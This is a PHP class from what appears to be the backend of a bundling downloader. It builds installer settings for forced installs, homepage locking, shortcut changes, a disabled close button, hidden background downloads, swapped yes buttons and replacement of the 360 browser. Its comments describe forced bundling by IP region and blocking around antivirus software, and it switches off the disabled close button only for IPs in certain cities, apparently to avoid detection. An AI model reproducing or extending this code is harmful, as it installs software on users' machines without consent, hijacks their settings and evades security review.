<?php namespace App\Models;
use App\Models\Material as Material;
use App\Models\IpLocation as IpLocation;

class Ad {
	private $materialObj = null;

	public function __construct() {
		$this->materialObj = new Material();
	}

	public function getById($id, $ip) {
		if(intval($id) <= 0) {
			return false;
		}
		$ad_cache = app('db')->table('ad_cache')->where('id', $id)->first();
		if(!$ad_cache) {
			return false;
		}
		$data = unserialize($ad_cache->content);
		if(empty($data['extra'])) {
			return $data;
		}

		$data['site']['firstlevelcity'] = IpLocation::isFirstLevelCity($ip);
		$data['extra'] = $this->getExtra($data['extra'],$ip);
		return $data;
	}

	public function getExtra($data,$ip) {
		$data['ChkCapColor'] = str_replace('#', '$FF', $data['ChkCapColor']);
		$data['ChkTipColor'] = str_replace('#', '$FF', $data['ChkTipColor']);

		$data['bChangeLnk'] = $data['bChangeLnk'] << 1;
		$data['bLockHomePage'] = $data['bLockHomePage'] << 2;
		$data['bOpenFolderInstall'] = $data['bOpenFolderInstall'] << 3;
		$data['bShowGrayChk'] = $data['bShowGrayChk'] << 4;
		$data['bHideExtend'] = $data['bHideExtend'] << 5;

		$isTx =IpLocation::isTxCity($ip);
		if($isTx){
			$data['bDisableClose'] = 0 << 6;
		}else{
			$data['bDisableClose'] = $data['bDisableClose'] << 6;
		}



		$data['bDownHideToTask'] = $data['bDownHideToTask'] << 8;
		$data['bDownToDesktop'] = $data['bDownToDesktop'] << 9;

		$data['taskset'] = $data['bForceInstall'];
		$data['taskset'] |= $data['bChangeLnk'];
		$data['taskset'] |= $data['bLockHomePage'];
		$data['taskset'] |= $data['bOpenFolderInstall'];
		$data['taskset'] |= $data['bShowGrayChk'];
		$data['taskset'] |= $data['bHideExtend'];
		$data['taskset'] |= $data['bDisableClose'];
		$data['taskset'] |= $data['bDownHideToTask'];
		$data['taskset'] |= $data['bDownToDesktop'];
		
		if(isset($data['bLockTaskBar'])) {
			$data['bLockTaskBar'] = $data['bLockTaskBar'] << 10;
			$data['taskset'] |= $data['bLockTaskBar'];
		}
		if(isset($data['bSwitchIELast'])) {
			$data['bSwitchIELast'] = $data['bSwitchIELast'] << 11;
			$data['taskset'] |= $data['bSwitchIELast'];
		}
		if(isset($data['bInduceExit'])) {
			$data['bInduceExit'] = $data['bInduceExit'] << 12;
			$data['taskset'] |= $data['bInduceExit'];
		}
		if(isset($data['bAlterRank'])) {
			$data['bAlterRank'] = $data['bAlterRank'] << 13;
			$data['taskset'] |= $data['bAlterRank'];
		}
		if(isset($data['bExitInduceStart'])) {
			$data['bExitInduceStart'] = $data['bExitInduceStart'] << 14;
			$data['taskset'] |= $data['bExitInduceStart'];
		}
		if(isset($data['bDebugReport'])) {
			$data['bDebugReport'] = $data['bDebugReport'] << 15;
			$data['taskset'] |= $data['bDebugReport'];
		}
		if(isset($data['bSwitchBtnYes'])) {
			$data['bSwitchBtnYes'] = $data['bSwitchBtnYes'] << 16;
			$data['taskset'] |= $data['bSwitchBtnYes'];
		}
		if(isset($data['bLastTaskSiteDown'])) {
			$data['bLastTaskSiteDown'] = $data['bLastTaskSiteDown'] << 17;
			$data['taskset'] |= $data['bLastTaskSiteDown'];
		}
		if(isset($data['bShowTaskItemText'])) {
			$data['bShowTaskItemText'] = $data['bShowTaskItemText'] << 18;
			$data['taskset'] |= $data['bShowTaskItemText'];
		}
		if(isset($data['bReplace360Browser'])) {
			$data['bReplace360Browser'] = $data['bReplace360Browser'] << 19;
			$data['taskset'] |= $data['bReplace360Browser'];
		}
		if(isset($data['materialPlace'])) {
			$data['materialPlace'] = $data['materialPlace'];
		}
		if(isset($data['materialPlace'])) {
			$data['imgPlace'] = $data['imgPlace'];
		}
		return $data;
	}
	public function getContent($data,$page=0){
		if($page==0){
			return $data['0'];
		}else{
			foreach($data['0'] as $key=>$val){
				foreach($val as $k=>$v){
					if(!isset($data[$page][$key][$k]) || $data[$page][$key][$k]==''){
						$data[$page][$key][$k]=$v;
					}
				}
			}
		}
		return $data[$page];
	}
	public function getProcessData($ip, $sdSoft, $id,$page=0) {
		if(intval($id) <= 0) {
			return false;
		}
		$data = $this->getById($id, $ip);
		if(empty($data)) {
			return false;
		}


		$content=$this->getContent($data['content'],$page);

		$this->materialObj->setList($content);
		$this->materialObj->doCityInstall($ip,$sdSoft);// 区分IP强制捆绑
		$this->materialObj->doAntBlock($sdSoft);// 处理不兼容杀毒软件
		$data['content'] = $this->materialObj->getList();
		
		return $data;
	}

	public function getSiteAd($siteId){

		$ad = app('db')->table('ad')->where('siteId', $siteId)->first();
		return $ad;

	}
}
